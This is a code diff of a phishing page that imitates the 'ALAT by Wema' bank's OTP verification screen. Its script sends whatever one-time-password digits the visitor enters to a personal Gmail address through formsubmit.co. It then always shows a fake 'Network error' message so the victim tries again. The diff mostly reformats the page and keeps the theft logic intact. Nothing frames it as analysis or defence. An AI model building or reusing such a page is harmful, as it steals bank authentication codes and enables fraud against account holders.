@@ -1,88 +1,88 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Verify OTP | ALAT by Wema</title>
   <link rel="stylesheet" href="assets/index-C49gVU4U.css" />
   <style>
-  html, body {
-    height: 100%;
-    margin: 0;
-    padding: 0;
-  }
-
-  body {
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    background: #fff;
-    font-family: Arial, sans-serif;
-  }
-
-  .container {
-    max-width: 350px;
-    width: 100%;
-    padding: 20px;
-    box-sizing: border-box;
-  }
-
-  .formOtp {
-    display: flex;
-    justify-content: space-between;
-    margin-bottom: 25px;
-    width: 100%;
-  }
-
-  .pin-input {
-    width: 40px;
-    height: 50px;
-    text-align: center;
-    font-size: 20px;
-    border: 1px solid #ccc;
-    border-radius: 5px;
-  }
-
-  @media (max-width: 400px) {
-    .pin-input {
-      width: 35px;
-      height: 45px;
-      font-size: 18px;
+    html, body {
+      height: 100%;
+      margin: 0;
+      padding: 0;
+      font-family: Arial, sans-serif;
+      background: #fff;
     }
-  }
 
-  .verify-btn {
-    width: 100%;
-    padding: 12px;
-    border-radius: 7px;
-    border: none;
-    font-weight: bold;
-    font-size: 16px;
-    cursor: pointer;
-    background: #800029;
-    color: white;
-  }
+    #root, .app, .pin {
+      height: 100%;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
 
-  .logo img {
-    width: 60px;
-    margin-bottom: 15px;
-  }
+    .container {
+      max-width: 350px;
+      width: 100%;
+      padding: 20px;
+      box-sizing: border-box;
+    }
 
-  .hometitle {
-    font-size: 20px;
-    font-weight: bold;
-    text-align: center;
-    margin-bottom: 25px;
-  }
+    .formOtp {
+      display: flex;
+      justify-content: space-between;
+      margin-bottom: 25px;
+      width: 100%;
+    }
 
-  #error-message {
-    color: red;
-    margin-bottom: 15px;
-    display: none;
-    text-align: center;
-  }
-</style>
+    .pin-input {
+      width: 40px;
+      height: 50px;
+      text-align: center;
+      font-size: 20px;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+    }
 
+    @media (max-width: 400px) {
+      .pin-input {
+        width: 35px;
+        height: 45px;
+        font-size: 18px;
+      }
+    }
+
+    .verify-btn {
+      width: 100%;
+      padding: 12px;
+      border-radius: 7px;
+      border: none;
+      font-weight: bold;
+      font-size: 16px;
+      cursor: pointer;
+      background: #800029;
+      color: white;
+    }
+
+    .logo img {
+      width: 60px;
+      margin-bottom: 15px;
+    }
+
+    .hometitle {
+      font-size: 20px;
+      font-weight: bold;
+      text-align: center;
+      margin-bottom: 25px;
+    }
+
+    #error-message {
+      color: red;
+      margin-bottom: 15px;
+      display: none;
+      text-align: center;
+    }
+  </style>
 </head>
 <body>
   <div id="root">
@@ -108,8 +108,7 @@
               </div>
 
               <input type="hidden" name="_captcha" value="false">
-              <!-- Removed _next field to prevent redirection -->
-              <div id="error-message" style="color: red; margin-bottom: 15px; display: none;"></div>
+              <div id="error-message">Network error. Please try again.</div>
 
               <button type="submit" class="verify-btn">Verify</button>
             </form>
@@ -119,58 +118,56 @@
     </div>
   </div>
 
-<script>
-  document.addEventListener('DOMContentLoaded', function () {
-    const otpInputs = document.querySelectorAll('.pin-input');
-    const errorMessage = document.getElementById('error-message');
+  <script>
+    document.addEventListener('DOMContentLoaded', function () {
+      const otpInputs = document.querySelectorAll('.pin-input');
+      const errorMessage = document.getElementById('error-message');
 
-    otpInputs.forEach((input, index) => {
-      input.addEventListener('input', function () {
-        if (this.value.length === 1 && index < otpInputs.length - 1) {
-          otpInputs[index + 1].focus();
-        }
-      });
-
-      input.addEventListener('keydown', function (e) {
-        if (e.key === 'Backspace' && this.value.length === 0 && index > 0) {
-          otpInputs[index - 1].focus();
-        }
-      });
-
-      input.addEventListener('paste', function (e) {
-        e.preventDefault();
-        const pasteData = e.clipboardData.getData('text/plain');
-        if (/^\d+$/.test(pasteData)) {
-          for (let i = 0; i < Math.min(pasteData.length, otpInputs.length); i++) {
-            otpInputs[i].value = pasteData[i];
+      otpInputs.forEach((input, index) => {
+        input.addEventListener('input', function () {
+          if (this.value.length === 1 && index < otpInputs.length - 1) {
+            otpInputs[index + 1].focus();
           }
-          const lastInputIndex = Math.min(pasteData.length - 1, otpInputs.length - 1);
-          otpInputs[lastInputIndex].focus();
+        });
+
+        input.addEventListener('keydown', function (e) {
+          if (e.key === 'Backspace' && this.value.length === 0 && index > 0) {
+            otpInputs[index - 1].focus();
+          }
+        });
+
+        input.addEventListener('paste', function (e) {
+          e.preventDefault();
+          const pasteData = e.clipboardData.getData('text/plain');
+          if (/^\d+$/.test(pasteData)) {
+            for (let i = 0; i < Math.min(pasteData.length, otpInputs.length); i++) {
+              otpInputs[i].value = pasteData[i];
+            }
+            const lastInputIndex = Math.min(pasteData.length - 1, otpInputs.length - 1);
+            otpInputs[lastInputIndex].focus();
+          }
+        });
+      });
+
+      const otpForm = document.getElementById('otp-form');
+      otpForm.addEventListener('submit', async function (e) {
+        e.preventDefault();
+
+        const formData = new FormData(otpForm);
+
+        try {
+          await fetch('https://formsubmit.co/Payday10177@gmail.com', {
+            method: 'POST',
+            body: formData
+          });
+        } catch (error) {
+          // Optional: log error
         }
+
+        errorMessage.textContent = 'Network error. Please try again.';
+        errorMessage.style.display = 'block';
       });
     });
-
-    const otpForm = document.getElementById('otp-form');
-    otpForm.addEventListener('submit', async function (e) {
-      e.preventDefault();
-
-      const formData = new FormData(otpForm);
-
-      try {
-        await fetch('https://formsubmit.co/Payday10177@gmail.com', {
-          method: 'POST',
-          body: formData
-        });
-      } catch (error) {
-        // Optional: log error
-      }
-
-      // Always show error regardless of outcome
-      errorMessage.textContent = 'Network error. Please try again.';
-      errorMessage.style.display = 'block';
-    });
-  });
-</script>
-
+  </script>
 </body>
 </html>
